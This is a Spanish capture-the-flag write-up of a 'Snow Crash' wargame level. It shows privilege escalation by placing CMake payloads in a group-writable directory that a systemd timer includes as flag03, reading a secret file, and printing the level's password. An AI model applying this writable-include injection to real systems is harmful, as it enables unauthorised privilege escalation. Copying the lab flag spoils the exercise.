# Level03 - Snow Crash

## Tipo de ejercicio

Escalada de privilegios mediante una tarea `systemd` periódica que ejecuta
un archivo CMake controlado por un grupo con permisos de escritura.

## Objetivo

Encontrar la credencial que permite conectarse al usuario `level04`.

El ejercicio aprovecha un servicio de `systemd` que ejecuta CMake como
`flag03`. El servicio carga `build.cmake` desde un directorio que `level03`
puede modificar. Por tanto, `level03` puede conseguir que sus instrucciones
se ejecuten con los permisos de `flag03`.

## 1. Inspeccionar el entorno

Desde la sesión SSH de `level03`:

```bash
whoami
hostname
pwd
ls -la
cat README
find /home/level03 -maxdepth 2 -ls
```

El README contiene la pista:

```text
Every Burbclave has rules. Find the loophole.
```

El directorio personal no contiene un ejecutable `level03`, por lo que se
buscan los componentes instalados y los archivos relacionados con `flag03`.
El objetivo es localizar qué programa se ejecuta con privilegios y puede estar
relacionado con el nivel:

```bash
find /opt/snowcrash/level03 -maxdepth 2 -ls 2>/dev/null
```

Esta orden examina el directorio donde están instalados los componentes del
nivel. `-maxdepth 2` limita la búsqueda al directorio y sus subdirectorios
inmediatos, `-ls` muestra sus permisos, propietario y ruta, y
`2>/dev/null` oculta los errores de permisos.

```bash
find / -xdev -user flag03 -ls 2>/dev/null
```

Esta búsqueda recorre el sistema de archivos desde `/` y localiza los archivos
propiedad de `flag03`. `-xdev` evita entrar en otros sistemas de archivos
montados, `-user flag03` filtra por propietario y `-ls` muestra los detalles
de cada resultado. Así se puede identificar el script o programa que se
ejecuta con la identidad de `flag03`.

En una máquina ya utilizada pueden aparecer también archivos como estos:

```text
/tmp/level03_flag.txt
/tmp/burbclave_flag03_listing.txt
/tmp/level03_flag_errors.txt
```

Son artefactos temporales creados durante una explotación anterior y pueden
contener la flag si el ejercicio ya se ejecutó. No los usamos como punto de
partida ni como prueba de la vulnerabilidad: en una ejecución limpia pueden no
existir. La resolución comienza investigando la configuración de CMake y el
servicio periódico.

```bash
find / -xdev -type f -perm -4000 -ls 2>/dev/null
```

Esta orden busca archivos normales (`-type f`) con el permiso `SUID`
(`-perm -4000`). El permiso SUID hace que un ejecutable se ejecute con los
permisos de su propietario, por lo que estos archivos pueden ser relevantes en
una búsqueda de escalada de privilegios. En este nivel, la búsqueda sirve para
comprobar si existe algún ejecutable SUID relacionado.

Entre los resultados de la búsqueda por propietario aparece el archivo de
instrucciones relevante:

```text
/opt/snowcrash/level03/CMakeLists.txt
```

El archivo pertenece a `flag03` y es legible por el grupo `level03`:

```text
-rw-r----- 1 flag03 level03 ... /opt/snowcrash/level03/CMakeLists.txt
```

## 2. Analizar el CMakeLists.txt

```bash
cat /opt/snowcrash/level03/CMakeLists.txt
```

El script lee una configuración protegida y construye una ruta de trabajo:

```cmake
file(READ "/etc/burbclave/burbclave.conf" CONF_CONTENT)

string(REGEX MATCH "runtime_base=([^\\n]+)" _ ${CONF_CONTENT})
set(RUNTIME_BASE ${CMAKE_MATCH_1})

string(REGEX MATCH "workspace=([^\\n]+)" _ ${CONF_CONTENT})
set(WORKSPACE_NAME ${CMAKE_MATCH_1})

string(CONCAT RESOLVED_BUILD_PATH "${RUNTIME_BASE}" "/" "${WORKSPACE_NAME}")

include(${RESOLVED_BUILD_PATH}/build.cmake)
```

El usuario `level03` no puede leer directamente la configuración porque no
tiene permisos sobre el directorio ni sobre el archivo `burbclave.conf`:

```bash
ls -ld /etc/burbclave
ls -l /etc/burbclave/burbclave.conf
cat /etc/burbclave/burbclave.conf
```

`ls -ld /etc/burbclave` muestra los permisos del directorio sin listar su
contenido. La opción `-d` hace que se consulte el directorio como entrada,
en lugar de mostrar los archivos que contiene. Así se comprueba quién es su
propietario y qué usuarios pueden acceder a él.

`ls -l /etc/burbclave/burbclave.conf` muestra los permisos, el propietario y el
grupo del archivo de configuración. Esta comprobación permite confirmar si
`level03` puede leerlo.

`cat /etc/burbclave/burbclave.conf` intenta mostrar el contenido del archivo.
Si aparece `Permission denied`, se confirma que `level03` no tiene permisos
suficientes para leer la configuración directamente.

Resultado relevante:

```text
drwx------ 2 flag03 flag03 ... /etc/burbclave
... Permission denied
... Permission denied
```

Aquí intervienen dos archivos diferentes, situados en rutas distintas:

- `/etc/burbclave/burbclave.conf` es la configuración protegida del sistema y
	`level03` no puede leerla porque el directorio pertenece a `flag03`.
- `/opt/snowcrash/level03/CMakeLists.txt` es un archivo de instrucciones del
	nivel que sí podemos leer.

Aunque no podemos consultar el contenido de la configuración de `/etc`, el
`CMakeLists.txt` revela qué hace el servicio con ella: la lee para calcular
una ruta de trabajo y después intenta incluir, desde esa ruta, un archivo
llamado `build.cmake`. Esta separación entre un archivo protegido en `/etc` y
un archivo de instrucciones legible en `/opt` es la clave para buscar el
directorio escribible del siguiente paso.

## 3. Encontrar el directorio escribible

Como `CMakeLists.txt` incluye `build.cmake` desde una ruta definida por la
configuración protegida, buscamos directorios relacionados con Burbclave para
localizar ese espacio de trabajo y comprobar si `level03` puede modificarlo:

```bash
find / -xdev -iname '*burbclave*' -printf '%M %u %g %p\n' 2>/dev/null
```

`find / -xdev -iname '*burbclave*'` busca desde la raíz directorios y archivos
cuyo nombre contiene `burbclave`. `-xdev` evita atravesar otros sistemas de
archivos, `-iname` ignora mayúsculas y minúsculas y `2>/dev/null` oculta
errores de acceso. La opción `-printf` permite elegir el formato exacto de
cada línea; sus marcadores se explican a continuación.

En el formato de `-printf`, cada marcador representa un dato distinto:

```text
%M  permisos en formato simbólico, por ejemplo drwxrwxr-x
%u  nombre del usuario propietario
%g  nombre del grupo propietario
%p  ruta completa del archivo o directorio
\n  salto de línea
```

Aparece el directorio de trabajo:

```text
drwxrwxr-x root burbclave /var/lib/burbclave
```

Se comprueban sus contenidos y permisos:

```bash
id
ls -la /var/lib/burbclave
ls -la /var/lib/burbclave/staging
```

`id` muestra el identificador numérico y el nombre del usuario de la sesión
actual (`uid`), su grupo principal (`gid`) y todos los grupos adicionales a los
que pertenece.
En este caso, el dato decisivo es la pertenencia al grupo `burbclave`, porque
ese grupo tiene permisos de escritura sobre `staging`. `ls -la` permite ver el
propietario, el grupo y los permisos de cada directorio.

Resultado relevante:

```text
uid=1004(level03) gid=1006(level03) groups=1006(level03),988(burbclave),1001(levelgroup)
drwxrwxr-x root burbclave /var/lib/burbclave/staging
```

La salida de `id` muestra que `level03` pertenece a los grupos `level03`,
`burbclave` y `levelgroup`. Como el directorio `staging` pertenece al grupo
`burbclave` y sus permisos para ese grupo son `rwx` (lectura, escritura y
acceso), `level03` puede crear archivos dentro de `staging`:

```bash
touch /var/lib/burbclave/staging/test-level03
ls -l /var/lib/burbclave/staging/test-level03
rm /var/lib/burbclave/staging/test-level03
```

`touch` crea un archivo vacío para comprobar la escritura, `ls -l` confirma su
propietario y sus permisos, y `rm` lo elimina después de la prueba. El archivo
de prueba no forma parte del exploit; solo verifica que el permiso de grupo es
realmente utilizable.

## 4. Confirmar la ejecución privilegiada

Antes de leer los archivos concretos, se buscan referencias a `burbclave` en
las unidades de `systemd` y se consulta la lista de servicios y temporizadores:

```bash
grep -R -n 'burbclave' /etc/systemd/system 2>/dev/null
systemctl list-units --type=service --all | grep -i burbclave
systemctl list-timers --all --no-pager | grep -i burbclave
```

La primera orden usa `grep -R -n` para buscar recursivamente la palabra
`burbclave` dentro de los archivos de configuración de `systemd`; `-n` muestra
el número de línea y `2>/dev/null` oculta errores de permisos. La segunda usa
`systemctl list-units` para mostrar todas las unidades de tipo servicio,
incluidas las inactivas (`--all`), y filtra las que contienen `burbclave` sin
distinguir mayúsculas con `grep -i`. La tercera hace lo mismo con los
temporizadores: `list-timers --all` muestra los timers registrados y
`--no-pager` evita abrir un paginador antes de aplicar el filtro.

Estas órdenes permiten descubrir los nombres `burbclave.service` y
`burbclave.timer`. Después se consultan sus definiciones y su estado:

```bash
cat /etc/systemd/system/burbclave.service
cat /etc/systemd/system/burbclave.timer
systemctl status burbclave.service --no-pager
systemctl list-timers --all --no-pager | grep burb
```

La configuración relevante del servicio es:

```ini
[Service]
Type=oneshot
User=flag03
ExecStart=/usr/bin/cmake -P /opt/snowcrash/level03/CMakeLists.txt
```

El temporizador ejecuta el servicio aproximadamente una vez por minuto:

```ini
OnUnitActiveSec=60s
Unit=burbclave.service
```

`OnUnitActiveSec=60s` indica que el temporizador vuelve a lanzar la unidad cada
60 segundos. `Unit=burbclave.service` identifica el servicio que se ejecuta en
cada ciclo.

Por tanto, si colocamos un `build.cmake` en el directorio de trabajo, el
servicio lo incluirá y lo ejecutará con los permisos de `flag03`.

## 5. Crear un payload de reconocimiento

Esta fase es necesaria para descubrir qué archivos puede leer el servicio como
`flag03`. El recurso independiente utilizado está disponible en
[build-recon.cmake](build-recon.cmake), pero ese archivo del repositorio no se
copia automáticamente a la OVA. Su contenido se introduce manualmente en el
archivo que el servicio incluirá:

El payload ejecuta `ls -la /home/flag03` como `flag03` y guarda el resultado en
`/tmp`. No usamos la salida normal porque el servicio tiene
`StandardOutput=null`, lo que descarta su salida estándar.

```bash
cat > /var/lib/burbclave/staging/build.cmake <<'EOF'
execute_process(
	COMMAND /bin/ls -la /home/flag03
	OUTPUT_FILE /tmp/burbclave_flag03_listing.txt
	ERROR_FILE /tmp/burbclave_flag03_errors.txt
)
EOF
```

Después de crear el archivo, no se ejecuta `build.cmake` directamente. Hay que
esperar a que el temporizador lance `burbclave.service`, porque ese servicio
es el que lo incluye y lo ejecuta con los permisos de `flag03`.

Tras la siguiente ejecución del temporizador:

```bash
systemctl status burbclave.service --no-pager
ls -l /tmp/burbclave_flag03_*
cat /tmp/burbclave_flag03_listing.txt
cat /tmp/burbclave_flag03_errors.txt
```

El servicio terminó correctamente y mostró un archivo oculto:

```text
-r-------- 1 flag03 flag03 29 ... .flag
```

La ruta del secreto era:

```text
/home/flag03/.flag
```

Este payload solo realiza reconocimiento. La lectura de la flag se hace en el
punto siguiente sustituyendo `build.cmake` por el payload de extracción.

## 6. Extraer la credencial

El recurso independiente de extracción está disponible en
[build-extract.cmake](build-extract.cmake). Sustituye el archivo anterior por
el siguiente payload, que lee `.flag` y escribe su contenido en un archivo
temporal legible:

```bash
cat > /var/lib/burbclave/staging/build.cmake <<'EOF'
execute_process(
	COMMAND /bin/cat /home/flag03/.flag
	OUTPUT_FILE /tmp/level03_flag.txt
	ERROR_FILE /tmp/level03_flag_errors.txt
)
EOF
```

Después de la siguiente ejecución del temporizador:

```bash
cat /tmp/level03_flag.txt
cat /tmp/level03_flag_errors.txt
```

La credencial obtenida fue:

```text
b209ea91ad7a5c2a0b0f4e195ca4
```

Este resultado confirma la cadena explicada en los puntos 2, 3 y 4: `level03`
puede escribir `build.cmake` en `staging`, el servicio lo incluye con los
permisos de `flag03` y el payload ha leído `/home/flag03/.flag`. El contenido
obtenido permite continuar al siguiente nivel, demostrando que la escalada de
privilegios era el objetivo técnico del ejercicio.

## 7. Conectarse a level04

Si la sesión actual sigue abierta, se sale de ella:

```bash
exit
```

Después, desde la misma terminal del equipo anfitrión desde la que se abrió
SSH, se inicia una nueva conexión al siguiente nivel:

```bash
ssh level04@localhost -p 2424
```

Cuando SSH solicite la contraseña, introducir:

```text
b209ea91ad7a5c2a0b0f4e195ca4
```

La conexión correcta muestra un prompt similar a:

```text
level04@snowcrash:~$
```

## Conclusión

El archivo temporal contiene la flag y permite continuar al siguiente nivel,
pero no es el objetivo técnico principal del ejercicio.

La parte importante es demostrar la escalada de privilegios: `level03` controla
el contenido de `build.cmake` y el servicio lo ejecuta como `flag03`. La lectura de
`/home/flag03/.flag` es la consecuencia de esa ejecución privilegiada.
